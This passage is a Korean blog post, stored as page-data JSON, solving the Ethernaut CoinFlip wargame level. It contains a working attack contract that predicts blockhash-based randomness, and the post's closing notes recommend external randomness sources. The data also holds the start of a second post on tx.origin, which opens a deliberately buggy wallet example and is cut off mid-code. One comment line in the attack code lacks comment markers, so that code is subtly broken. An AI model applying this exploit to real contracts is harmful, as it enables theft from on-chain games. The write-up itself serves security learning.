{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/ethernaut/3_coinFilp_ethernaut/3_coinFlip_ethernaut/",
    "result": {"data":{"cur":{"id":"75b5c2d9-4932-58ad-9801-02a072fd28cb","html":"<h1 id=\"-1-coinflip\" style=\"position:relative;\"><a href=\"#-1-coinflip\" aria-label=\" 1 coinflip permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 1. CoinFlip</h1>\n<p><strong>Difficulty 3/10</strong></p>\n<ul>\n<li>승리 조건</li>\n<li>코드 분석</li>\n<li>풀이</li>\n</ul>\n<p>순서로 진행 될 것이다.</p>\n<hr>\n<h2 id=\"승리-조건\" style=\"position:relative;\"><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\" aria-label=\"승리 조건 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>승리 조건</h2>\n<ul>\n<li>동전 뒤집기 게임에서 10번 연속 예측 성공하기</li>\n</ul>\n<hr>\n<h2 id=\"코드-분석\" style=\"position:relative;\"><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\" aria-label=\"코드 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>코드 분석</h2>\n<p>분석은 주석에!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\r\n\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CoinFlip</span> <span class=\"token punctuation\">{</span>\r\n\r\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token comment\">// 연속 win의 수</span>\r\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> consecutiveWins<span class=\"token punctuation\">;</span>\r\n  <span class=\"token comment\">// 이전 flip()에 사용됐던 hash 값 </span>\r\n  <span class=\"token builtin\">uint256</span> lastHash<span class=\"token punctuation\">;</span>\r\n  <span class=\"token comment\">// 난수 생성을 위한 값</span>\r\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\r\n  \r\n  <span class=\"token comment\">//constructor: consecutiveWins 초기 값을 0으로 setting</span>\r\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n    consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token comment\">//동전 뒤집기 예측을 위한 function</span>\r\n  <span class=\"token comment\">//return boolean</span>\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token comment\">// blockValue에 last blockhash를 uint256으로 casting해 저장한다</span>\r\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">//만약 이전 게임에서 사용했던 hash라면 답이 같을 수 있음으로 revert한다</span>\r\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lastHash <span class=\"token operator\">==</span> blockValue<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n    \r\n    <span class=\"token comment\">// 이번 게임에서 사용 될 hash를 저장</span>\r\n    lastHash <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">//blockValue를 FACTOR로 나눈 값을 coinFilip에 저장한다.</span>\r\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>FACTOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">// coinFlip의 숫자와 1이 같으면 side에 true, 다르면 false를 저장한다.</span>\r\n    <span class=\"token builtin\">bool</span> side <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token comment\">// 만약 side와 _guess가 같다면 실행, 즉 user의 예측이 맞았다면 실행</span>\r\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>side <span class=\"token operator\">==</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token comment\">// 연속 win의 수에 1을 더한다</span>\r\n      consecutiveWins<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\r\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span> \r\n    <span class=\"token comment\">// 만약 side와 _guess가 다르다면 실행, 즉 user의 예측이 틀렸다면 실행</span>\r\n    <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token comment\">// 연속 win의 수를 초기화 시킨다.</span>\r\n      consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n  <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span></code></pre></div>\n<hr>\n<h3 id=\"풀이를-위한-setup\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\" aria-label=\"풀이를 위한 setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이를 위한 Setup</h3>\n<p><a href=\"https://remix.ethereum.org\">RemixIDE</a>를 사용한다.\r\nremix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!\r\n그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다.</p>\n<p>한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.\r\n또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 “Injected Web3”를 선택해주어야 한다.</p>\n<h2 id=\"풀이\" style=\"position:relative;\"><a href=\"#%ED%92%80%EC%9D%B4\" aria-label=\"풀이 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>풀이</h2>\n<p>이 문제는 random으로 생성되는 값을 연속해서 맞추는 것이다.\r\n그리고 이 문제에서 주목해야 할 점은 randomness이다.</p>\n<p>solidity를 사용하여 randomness를 생성하는 것은 매우 까다롭고 대부분의 방법은 hacking 당하기 쉽다. 그래서 randomness를 생성하는 곳을 파고들어야 한다.</p>\n<p>이 CoinFlip contract에서는 미리 정해진 FACTOR과 이전 block의 hash를 사용하여 randomness를 생성한다.</p>\n<p>blockhash의 특징은 무엇일까? 우선 blockhash는 트랜잭션이 추가된 block의 hash 값이다. 즉 같은 block에 있는 transaction은 같은 blockhash를 가진다.</p>\n<p>그렇다면 우리가 같은 block에 transaction을 보낸다면 해킹이 가능 할 것이다!</p>\n<p>나는 그래서 CoinFlipAttack contract를 새로 만들었다.</p>\n<p>주석을 통해 CoinFlipAttack contract를 같이 분석 해보자!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">//아마 위해서 본 CoinFlip contract와 매우 비슷할 것이다.</span>\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CoinFlipAttack</span> <span class=\"token punctuation\">{</span>\r\n\r\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> consecutiveWins<span class=\"token punctuation\">;</span>\r\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> lastHash<span class=\"token punctuation\">;</span>\r\n  <span class=\"token comment\">// CoinFlip.flip()의 결과를 예측하기 위해 같은 FACTOR를 쓴다.</span>\r\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\r\n  <span class=\"token comment\">//CoinFlip contract의 address</span>\r\n  <span class=\"token builtin\">address</span> coinFlipAddress<span class=\"token punctuation\">;</span>\r\n\r\n  <span class=\"token comment\">//contructor: 배포시 CoinFlip의 address를 포함해 배포한다.</span>\r\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _coinFlipAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n    consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">//coinFlipAddress를 CoinFlip의 address로 설정한다.</span>\r\n    coinFlipAddress <span class=\"token operator\">=</span> _coinFlipAddress<span class=\"token punctuation\">;</span>\r\n  <span class=\"token punctuation\">}</span>\r\n\r\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token comment\">//CounFlip contract와 똑같이 blockValue를 생성한다.</span>\r\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lastHash <span class=\"token operator\">==</span> blockValue<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n      <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    lastHash <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">;</span>\r\n    <span class=\"token comment\">//CounFlip contract와 똑같이 conFlip 값을 생성한다.</span>\r\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>FACTOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n    <span class=\"token builtin\">bool</span> side <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\r\n    이미 맞춘 값을 CoinFlip<span class=\"token punctuation\">.</span>flip에 보내 해킹한다<span class=\"token punctuation\">.</span>\r\n    <span class=\"token function\">CoinFlip</span><span class=\"token punctuation\">(</span>coinFlipAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>side<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n\r\n  <span class=\"token punctuation\">}</span>\r\n<span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<p>즉 CoinFlipAttack.flip()을 다른 블록에 10번 call하면 해킹에 성공하게 된다.</p>\n<p>완료 후 Submit instance를 누르고 조금 기다리면 block이 mine되고,</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!</code></pre></div>\n<hr>\n<h2 id=\"마무리\" style=\"position:relative;\"><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\" aria-label=\"마무리 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>마무리</h2>\n<p>solidity에서 randomness를 생성하는 것은 까다롭다. block.timestamp, block.hash등을 사용할 수 있지만 이는 모두 예측이 가능하다. 그래서 contract에서 randomness를 생성하는 것이 아니라 외부에 가져오는 것이 좋다. Openzeppline에서는 Chainlink VRF, RANDAO, Oraclize를 사용하는 것을 권장하고 있다. 앞으로 randomness를 만들때 조심하자!</p>\n<hr>\n<h2 id=\"기타-정보\" style=\"position:relative;\"><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\" aria-label=\"기타 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>기타 정보</h2>\n<ul>\n<li>rinkeyb network ether faucet: <a href=\"https://faucets.chain.link/rinkeby\">https://faucets.chain.link/rinkeby</a></li>\n<li>ethernaut: <a href=\"https://ethernaut.openzeppelin.com/\">https://ethernaut.openzeppelin.com/</a></li>\n<li>remix IDE: <a href=\"https://remix.ethereum.org\">https://remix.ethereum.org</a></li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8A%B9%EB%A6%AC-%EC%A1%B0%EA%B1%B4\">승리 조건</a></p>\n</li>\n<li>\n<p><a href=\"#%EC%BD%94%EB%93%9C-%EB%B6%84%EC%84%9D\">코드 분석</a></p>\n<ul>\n<li><a href=\"#%ED%92%80%EC%9D%B4%EB%A5%BC-%EC%9C%84%ED%95%9C-setup\">풀이를 위한 Setup</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#%ED%92%80%EC%9D%B4\">풀이</a></p>\n</li>\n<li>\n<p><a href=\"#%EB%A7%88%EB%AC%B4%EB%A6%AC\">마무리</a></p>\n</li>\n<li>\n<p><a href=\"#%EA%B8%B0%ED%83%80-%EC%A0%95%EB%B3%B4\">기타 정보</a></p>\n</li>\n</ul>\n</div>","excerpt":"👋 1. CoinFlip Difficulty 3/10 승리 조건 코드 분석 풀이 순서로 진행 될 것이다. 승리 조건 동전 뒤집기 게임에서 10번 연속 예측 성공하기 코드 분석 분석은 주석에! 풀이를 위한 Setup RemixIDE를 사용한다.\r\nremix 사용법은 YouTube와 google에 많이 나와있으니 최신것으로 찾아보자!\r\n그리고 docs를 읽어본다면 사용법을 쉽게 익힐 수 있을 것이다. 한 가지 주의할 점은 CoinFlip은 remix에서 바로 deploy하는 것이 아니라 ethernauts에서 만든 instance의 주소를 가지고 addressAt을 누르면 된다.\r\n또한 우리는 Rinkeby Network를 사용하고 있으니 ENVIRONMENT를 “Injected Web3”를 선택해주어야 한다. 풀이 이 문제는 random으로 생성되는 값을 연속해서 맞추는 것이다.\r\n그리고 이 문제에서 주목해야 할 점은 randomness이다. solidity를 사용하여 randomn…","frontmatter":{"date":"January 06, 2022","title":"(Ethernaut 취약점 3) CoinFlip","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/ethernaut/3_coinFilp_ethernaut/3_coinFlip_ethernaut/"}},"next":{"id":"b07cd563-6b17-5ce7-b7b0-e27977da9b90","html":"<h1 id=\"-txorigin\" style=\"position:relative;\"><a href=\"#-txorigin\" aria-label=\" txorigin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 tx.origin</h1>\n<h2 id=\"txorigin-vs-msgsender\" style=\"position:relative;\"><a href=\"#txorigin-vs-msgsender\" aria-label=\"txorigin vs msgsender permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>txorigin vs msg.sender</h2>\n<p>주로 tx.origin은 msg.sender과 비교된다.<br>\n우선 우리가 잘 아는 msg.sender는 함수를 호출한 사람을 가리키는 주소이다.\r\ntx.origin을 보면 tx는 transaction을 뜻한다. 즉 transaction을 만든 address를 뜻한다.</p>\n<p>만약 account에서 smart contract A로 transaction을 보낸다면 msg.sender와 tx.origin은 같을 것이다. 왜냐하면 transaction을 만든이와 transaction을 보낸 사람이 같기 때문이다.</p>\n<p>그렇다면 account -> smart contract A -> smart contract B 순으로 transaction을 보낸다면 어떻게 될까? B의 관점에서 본다면 transaction을 만든이는 account이고 msg.sender은 A일 것이다.\r\n밑에 사진을 본다면 이해가 더 쉬울 것이다.\r\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACAUlEQVQoz22SW3OaUBSF/Q0JiBq8h8amoVqrJirgHRw0auDsA+cAoqYqiTE1nelL3/rPO+o09aEz62nN/mZf1g5xCnx1nqX5W7LrsHWTkyGh04ROy97Lnf9am32veJuETpMDh1ftsIw4Bd4VSg6cjDH96C5SQyfatlL3rgA+r9rRFi4Ewd3PbaSJeY0kh27WmLJ1xDVO4PTYjWvkxv8mID/ati7Nadacxrp2pIXFVVB+23JN60Ilqf/CsY6V6FNeJdEmDkuIk0G0lgUS3MCiDKQCRKLO9YTG9X0PToFIA/+DORmYmnFeM477RBTI6YvcYP5Jg8rQrE6gNISYgpiqydRMRjKZunkCK5AbzvPGOtGlR/6iZ3+xgxLZfJgsGAVYGcIK8H0iwvLW3ZbdTaxlHStDvEaKj0+V1Tbeo6yEoh1LQL5Il/Xd7srw0yOXkxCvkazhX5PH25dXYexnDmakAaHUvcs1QCAzAWa8SnJ0wWskPqTy7x+MgtMPPtexBXvO90kWTau/dmd1lBx5ZzXEyhBK6jQ99gSYxfs0LKFoC4vuKu+tC7N1yfXzyMmpKKNaorfOe8Fnb1mkU/GBXqlIUA87cwqEJfT+AHljXYSn0thpA3QxbgGkOnuzhJ/LI7sFWLWwbOLL3l94n95JgAftB2NlYKTDzWR0FCMBI8O5tPf/AJn9qjVT/O4AAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"tx.origin_vs_msg.sender\"\n        title=\"tx.origin_vs_msg.sender\"\n        src=\"/static/3901a82f29a2ffd4056cf6dc2bf82a5c/37523/txorigin_vs_msg.sender.png\"\n        srcset=\"/static/3901a82f29a2ffd4056cf6dc2bf82a5c/e9ff0/txorigin_vs_msg.sender.png 180w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/f21e7/txorigin_vs_msg.sender.png 360w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/37523/txorigin_vs_msg.sender.png 720w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/302a4/txorigin_vs_msg.sender.png 1080w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/07a9c/txorigin_vs_msg.sender.png 1440w,\n/static/3901a82f29a2ffd4056cf6dc2bf82a5c/29114/txorigin_vs_msg.sender.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<hr>\n<h2 id=\"example-code\" style=\"position:relative;\"><a href=\"#example-code\" aria-label=\"example code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example Code</h2>\n<p>이 Example Code는 solidity docs에 나와있는 내용이다!</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: GPL-3.0</span>\r\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">>=</span><span class=\"token version number\">0.7.0</span> <span class=\"token operator\">&lt;</span><span class=\"token version number\">0.9.0</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token comment\">// THIS CONTRACT CONTAINS A BUG - DO NOT USE</span>\r\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TxUserWallet</span> <span class=\"token punctuation\">{</span>\r\n    <span class=\"token builtin\">address</span> owner<span class=\"token punctuation\">;</span>\r\n\r\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\r\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\r\n    <span class=\"token punctuation\">}</span>\r\n\r\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> dest<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\r\n        